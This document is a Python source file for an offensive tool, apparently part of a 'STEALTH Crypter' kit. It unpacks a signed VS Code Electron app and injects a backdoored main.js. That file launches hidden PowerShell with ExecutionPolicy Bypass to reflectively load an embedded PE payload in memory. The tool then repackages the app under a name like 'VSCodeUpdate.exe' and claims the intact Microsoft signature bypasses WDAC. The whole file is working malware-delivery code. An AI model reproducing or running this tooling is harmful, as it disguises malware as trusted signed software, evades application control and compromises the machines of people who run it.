#!/usr/bin/env python3
"""
Electron App Tampering Tool for STEALTH Crypter
Injects backdoored main.js with reflective PS loader into signed Electron apps
Result: Single signed EXE that bypasses WDAC enforcement
"""

import os
import sys
import json
import shutil
import base64
import struct
from pathlib import Path

# Simple ASAR unpacker/packer (no npm needed)
class AsarArchive:
    """Minimal ASAR format handler"""
    
    @staticmethod
    def unpack(asar_path, output_dir):
        """Extract ASAR archive"""
        with open(asar_path, 'rb') as f:
            # ASAR format: 4 bytes header size, 4 bytes unused, JSON header, files
            header_size = struct.unpack('<I', f.read(4))[0]
            f.read(4)  # Skip unused
            header_json = f.read(header_size - 8).decode('utf-8')
            header = json.loads(header_json)
            
            os.makedirs(output_dir, exist_ok=True)
            AsarArchive._extract_files(f, header['files'], output_dir, f.tell())
    
    @staticmethod
    def _extract_files(f, files_dict, base_path, data_offset):
        """Recursively extract files from ASAR"""
        for name, info in files_dict.items():
            target = os.path.join(base_path, name)
            
            if 'files' in info:  # Directory
                os.makedirs(target, exist_ok=True)
                AsarArchive._extract_files(f, info['files'], target, data_offset)
            else:  # File
                offset = int(info['offset'])
                size = int(info['size'])
                current_pos = f.tell()
                f.seek(data_offset + offset)
                data = f.read(size)
                f.seek(current_pos)
                
                with open(target, 'wb') as out:
                    out.write(data)
    
    @staticmethod
    def pack(source_dir, asar_path):
        """Create ASAR archive"""
        files_dict = {}
        file_data = []
        current_offset = 0
        
        # Build file tree
        for root, dirs, files in os.walk(source_dir):
            rel_root = os.path.relpath(root, source_dir)
            current_dict = files_dict
            
            if rel_root != '.':
                for part in Path(rel_root).parts:
                    if part not in current_dict:
                        current_dict[part] = {'files': {}}
                    current_dict = current_dict[part]['files']
            
            for filename in files:
                filepath = os.path.join(root, filename)
                with open(filepath, 'rb') as f:
                    data = f.read()
                
                current_dict[filename] = {
                    'size': len(data),
                    'offset': str(current_offset)
                }
                file_data.append(data)
                current_offset += len(data)
        
        # Write ASAR
        header = {'files': files_dict}
        header_json = json.dumps(header, separators=(',', ':')).encode('utf-8')
        header_size = len(header_json) + 8
        
        with open(asar_path, 'wb') as f:
            f.write(struct.pack('<I', header_size))
            f.write(struct.pack('<I', header_size + 4))  # Unused
            f.write(header_json)
            for data in file_data:
                f.write(data)


def generate_backdoored_mainjs(stub_base64, stub_size):
    """Generate main.js with embedded PS reflective loader"""
    
    template = f'''// Electron App - Tampered by STEALTH Crypter
const {{ app }} = require('electron');
const {{ spawn }} = require('child_process');
const fs = require('fs');
const path = require('path');

// Embedded encrypted stub (base64)
const STUB_BASE64 = "{stub_base64}";

// Reflective PE loader (PowerShell + Add-Type C#)
const PS_LOADER = `
$ErrorActionPreference = 'SilentlyContinue';
$bytes = [Convert]::FromBase64String(@'
{stub_base64}
'@);

# Compile reflective PE loader in-memory
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ReflectiveLoader {{
    [DllImport(\\"kernel32.dll\\")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport(\\"kernel32.dll\\")]
    public static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect, out uint oldProtect);
    
    [DllImport(\\"kernel32.dll\\")]
    public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    
    [DllImport(\\"kernel32.dll\\")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
    
    public static void Execute(byte[] peBytes) {{
        // Parse PE headers
        int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
        int sizeOfImage = BitConverter.ToInt32(peBytes, e_lfanew + 0x50);
        int entryPointRva = BitConverter.ToInt32(peBytes, e_lfanew + 0x28);
        int numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + 0x06);
        int sizeOfHeaders = BitConverter.ToInt32(peBytes, e_lfanew + 0x54);
        
        // Allocate memory for PE image
        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, 0x3000, 0x04);
        if (baseAddr == IntPtr.Zero) return;
        
        // Copy headers
        Marshal.Copy(peBytes, 0, baseAddr, sizeOfHeaders);
        
        // Copy sections
        int sectionHeaderOffset = e_lfanew + 0xF8;
        for (int i = 0; i < numberOfSections; i++) {{
            int offset = sectionHeaderOffset + (i * 40);
            int virtualAddress = BitConverter.ToInt32(peBytes, offset + 12);
            int sizeOfRawData = BitConverter.ToInt32(peBytes, offset + 16);
            int pointerToRawData = BitConverter.ToInt32(peBytes, offset + 20);
            
            if (sizeOfRawData > 0 && pointerToRawData > 0) {{
                IntPtr sectionAddr = new IntPtr(baseAddr.ToInt64() + virtualAddress);
                Marshal.Copy(peBytes, pointerToRawData, sectionAddr, Math.Min(sizeOfRawData, peBytes.Length - pointerToRawData));
            }}
        }}
        
        // Set executable permissions
        uint oldProtect;
        VirtualProtect(baseAddr, (uint)sizeOfImage, 0x40, out oldProtect);
        
        // Create thread at entry point
        IntPtr entryPoint = new IntPtr(baseAddr.ToInt64() + entryPointRva);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, entryPoint, IntPtr.Zero, 0, IntPtr.Zero);
        
        if (hThread != IntPtr.Zero) {{
            WaitForSingleObject(hThread, 5000);
        }}
    }}
}}
"@;

[ReflectiveLoader]::Execute($bytes);
`;

// Execute reflective loader
function executeStub() {{
    const ps = spawn('powershell.exe', [
        '-ExecutionPolicy', 'Bypass',
        '-WindowStyle', 'Hidden',
        '-NoProfile',
        '-Command', PS_LOADER
    ], {{
        detached: true,
        stdio: 'ignore'
    }});
    
    ps.unref();
}}

// Run on startup
app.on('ready', () => {{
    // Execute stub in background
    setTimeout(executeStub, 500);
    
    // Exit immediately (no window)
    setTimeout(() => app.quit(), 2000);
}});

app.on('window-all-closed', () => {{
    app.quit();
}});
'''
    
    return template


def tamper_electron_app(vscode_path, stub_path, output_exe):
    """
    Tamper signed Electron app with backdoored main.js
    
    Args:
        vscode_path: Path to extracted VS Code folder
        stub_path: Path to packed STEALTH stub
        output_exe: Output path for tampered EXE
    """
    
    print(f"[*] Electron App Tampering Tool")
    print(f"[*] Base: {vscode_path}")
    print(f"[*] Stub: {stub_path}")
    print(f"[*] Output: {output_exe}")
    print()
    
    # Read stub and encode
    print("[1/5] Encoding stub...")
    with open(stub_path, 'rb') as f:
        stub_bytes = f.read()
    
    stub_base64 = base64.b64encode(stub_bytes).decode('ascii')
    print(f"[+] Stub size: {len(stub_bytes)} bytes")
    print(f"[+] Base64 size: {len(stub_base64)} bytes")
    
    # Check if already extracted or need to unpack asar
    app_dir = os.path.join(vscode_path, 'resources', 'app')
    asar_path = os.path.join(vscode_path, 'resources', 'app.asar')
    temp_dir = 'bin/electron_temp_app'
    
    print(f"\n[2/5] Preparing app folder...")
    
    if os.path.exists(app_dir) and os.path.isdir(app_dir):
        # Already extracted (portable version)
        print(f"[+] Found extracted app at: {app_dir}")
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        shutil.copytree(app_dir, temp_dir)
        print(f"[+] Copied to {temp_dir}")
    elif os.path.exists(asar_path):
        # Need to unpack asar
        print(f"[+] Found app.asar, extracting...")
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        AsarArchive.unpack(asar_path, temp_dir)
        print(f"[+] Extracted to {temp_dir}")
    else:
        print(f"[!] Error: Neither app/ nor app.asar found in resources/")
        return False
    
    # Generate backdoored main.js
    print(f"\n[3/5] Generating backdoored main.js...")
    backdoored_js = generate_backdoored_mainjs(stub_base64, len(stub_bytes))
    
    main_js_path = os.path.join(temp_dir, 'main.js')
    with open(main_js_path, 'w', encoding='utf-8') as f:
        f.write(backdoored_js)
    
    print(f"[+] Wrote {len(backdoored_js)} bytes to main.js")
    
    # Repack app folder (keep as folder for portable, or pack to asar)
    print(f"\n[4/5] Preparing backdoored app...")
    
    # For portable version, just use the modified folder directly
    # No need to repack to asar
    print(f"[+] Backdoored app ready at {temp_dir}")
    
    # Create tampered copy
    print(f"\n[5/5] Creating tampered Electron app...")
    
    # Determine output directory (folder with same name as EXE)
    output_base = Path(output_exe)
    output_folder = output_base.parent / output_base.stem
    
    if output_folder.exists():
        shutil.rmtree(output_folder)
    output_folder.mkdir(parents=True, exist_ok=True)
    
    print(f"[+] Copying entire Electron folder structure...")
    
    # Copy entire VS Code folder to output location
    for item in Path(vscode_path).iterdir():
        dest = output_folder / item.name
        if item.is_dir():
            shutil.copytree(item, dest, dirs_exist_ok=True)
        else:
            shutil.copy2(item, dest)
    
    # Replace app folder with backdoored version
    tampered_app = output_folder / 'resources' / 'app'
    if tampered_app.exists():
        shutil.rmtree(tampered_app)
    shutil.copytree(temp_dir, tampered_app)
    
    # Rename Code.exe to user's specified name
    code_exe = output_folder / 'Code.exe'
    final_exe = output_folder / output_base.name
    
    if code_exe.exists():
        code_exe.rename(final_exe)
        
        print(f"[+] Created: {final_exe}")
        print(f"[+] Size: {final_exe.stat().st_size} bytes")
        print()
        print(f"[✓] SUCCESS: Tampered Electron app ready")
        print(f"[*] Signature: Original MS signature intact")
        print(f"[*] WDAC: Should bypass (signed outer EXE)")
        print(f"[*] Deploy folder: {output_folder}")
        print(f"[*] Main EXE: {output_base.name}")
        print()
        print(f"[!] IMPORTANT: Deploy entire '{output_folder.name}' folder, not just the EXE!")
        print(f"[!] The EXE needs supporting DLLs from the folder to run properly.")
        
        return True
    else:
        print(f"[!] Error: Code.exe not found in {output_folder}")
        return False


def main():
    if len(sys.argv) < 4:
        print("Usage: electron_tamper.py <vscode_folder> <stub.exe> <output.exe>")
        print()
        print("Example:")
        print("  python electron_tamper.py bin/vscode_base test_integration_real/packed_with_ATT-009.exe bin/VSCodeUpdate.exe")
        sys.exit(1)
    
    vscode_path = sys.argv[1]
    stub_path = sys.argv[2]
    output_exe = sys.argv[3]
    
    if not os.path.exists(vscode_path):
        print(f"[!] Error: VS Code folder not found: {vscode_path}")
        sys.exit(1)
    
    if not os.path.exists(stub_path):
        print(f"[!] Error: Stub not found: {stub_path}")
        sys.exit(1)
    
    success = tamper_electron_app(vscode_path, stub_path, output_exe)
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
